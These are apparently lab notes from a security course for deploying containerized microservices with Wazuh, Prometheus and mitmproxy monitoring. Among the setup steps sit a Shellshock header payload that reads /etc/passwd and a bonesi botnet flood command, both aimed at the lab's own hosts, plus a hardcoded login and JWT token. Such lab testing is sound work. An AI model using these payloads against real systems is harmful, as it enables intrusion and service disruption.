### localhost on projeto1/myservice
python3 -m http.server


### registry DONE
incus launch images:ubuntu/20.04 registry --profile default

setup:
incus shell registry
apt install wget nano pip
wget http://10.0.2.15:8000/requirements.txt
wget http://10.0.2.15:8000/registry.py
pip install -r requirements.txt

run: 
incus shell registry
python3 registry.py
http://{ip}:5000/services

auth:
	get token: 
		curl -X POST http://10.151.101.12:5000/auth/login \
		-H "Content-Type: application/json" \
		-d '{"username": "ssle", "password": "ssle"}'

		{"token":
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNzbGUiLCJleHAiOjE3MzE4NjkyODR9.dWQcG17u_7nwc34j-4cbJCWykpuVpb7X3PNyniKnsGg"
		}

	make requests:
		
		curl -X GET http://10.151.101.12:5000/services \
		-H "Authorization: Bearer <token>"


setup wazup agent:
	apt install gpg curl iptables
	curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg
	echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list
	apt-get update
	WAZUH_MANAGER="WAZUH_IP" apt-get install wazuh-agent
	systemctl daemon-reload
	systemctl enable wazuh-agent
	systemctl start wazuh-agent

	shellshock:
 		curl -H "User-Agent: () { :; }; /bin/cat /etc/passwd" 10.151.101.12:5000/services
	
	auth brute force:
		
	
### sensor DONE
incus launch images:ubuntu/20.04 sensor --profile default

setup: 
incus shell sensor
apt install wget nano pip
wget http://10.0.2.15:8000/requirements.txt
wget http://10.0.2.15:8000/sensor.py
pip install -r requirements.txt

run:
incus shell sensor
python3 sensor.py

### temperatureC DONE
incus launch images:ubuntu/20.04 temperatureC --profile default

setup:
incus shell temperatureC
apt install wget nano pip
wget http://10.0.2.15:8000/requirements.txt
wget http://10.0.2.15:8000/temperature_C.py
pip install -r requirements.txt


incus profile add temperatureC weak
incus profile remove temperatureC default

run:
incus shell temperatureC
python3 temperature_C.py

make requests:
	curl -X GET http://10.151.101.153:5003/temps \
        -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNzbGUiLCJleHAiOjE3MzE4NjkyODR9.dWQcG17u_7nwc34j-4cbJCWykpuVpb7X3PNyniKnsGg"
	
	curl -X GET http://10.151.101.153:5003/tempsbyConti?continent=africa \
        -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNzbGUiLCJleHAiOjE3MzE4NjkyODR9.dWQcG17u_7nwc34j-4cbJCWykpuVpb7X3PNyniKnsGg"
	
	curl -X GET http://10.151.101.153:5003/temps_of_day?date=2024-11-12 \
        -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNzbGUiLCJleHAiOjE3MzE4NjkyODR9.dWQcG17u_7nwc34j-4cbJCWykpuVpb7X3PNyniKnsGg"


### temperatureF DONE
incus launch images:ubuntu/20.04 temperatureF --profile default

setup:
incus shell temperatureF
apt install wget nano pip
pip install -r requirements.txt

run:
incus shell temperatureF
python3 temperature_F.py

make requests:
	curl -X GET http://10.151.101.136:5004/temps \
        -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNzbGUiLCJleHAiOjE3MzE4NjkyODR9.dWQcG17u_7nwc34j-4cbJCWykpuVpb7X3PNyniKnsGg"
	
	curl -X GET http://10.151.101.136:5004/tempsbyConti?continent=africa \
        -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNzbGUiLCJleHAiOjE3MzE4NjkyODR9.dWQcG17u_7nwc34j-4cbJCWykpuVpb7X3PNyniKnsGg"
	
	curl -X GET http://10.151.101.136:5004/temps_of_day?date=2024-11-12 \
        -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNzbGUiLCJleHAiOjE3MzE4NjkyODR9.dWQcG17u_7nwc34j-4cbJCWykpuVpb7X3PNyniKnsGg"


### exporter DONE 2/3 (?sensor?)
incus launch images:ubuntu/20.04 exporter --profile default

setup:
incus shell exporter
apt install wget nano pip
wget http://10.0.2.15:8000/requirements.txt
wget http://10.0.2.15:8000/exporter.py
pip install -r requirements.txt
apt install iptables

run:
incus shell exporter
python3 exporter.py
(http://{ip}:9090/classic/targets)

### mqtt-broker NOT DONE
incus launch images:ubuntu/20.04 mqtt-broker --profile default
incus exec mqtt-broker -- apt update
incus exec mqtt-broker -- apt install -y mosquitto mosquitto-clients
incus exec mqtt-broker -- systemctl start mosquitto

### prometheus
add exporter --> vi /ect/prometheus/prometheus.yml

### botnet

run:
incus shell botnet-container
bonesi --ips=50k-bots 10.151.101.153:5003 (temperaturaC)

### CHECK METRIC
curl http://10.151.101.37:8000/metrics
or
http://{ip}:9090/classic/targets


### MITM
incus launch images:ubuntu/22.04 mitmproxy --profile default
incus config device add mitmproxy proxy-port4 proxy listen=tcp:0.0.0.0:8080 connect=tcp:127.0.0.1:8080
incus config device add mitmproxy proxy-port5 proxy listen=tcp:0.0.0.0:8081 connect=tcp:127.0.0.1:8081
sudo ufw allow 8081/tcp
sudo ufw allow 8080/tcp

setup:
incus shell mitmproxy
apt install git python3.10 python3.10-venv
git clone https://github.com/mitmproxy/mitmproxy.git
cd mitmproxy
python3 -m venv venv
venv/bin/pip install -e ".[dev]"

run:
source venv/bin/activate
mitmweb --listen-port 8080 --web-port 8081 --listen-host 0.0.0.0 --ssl-insecure



### normal user
incus launch images:ubuntu/22.04 user --profile default

setup:
incus shell user

run:
python3 consumer.py
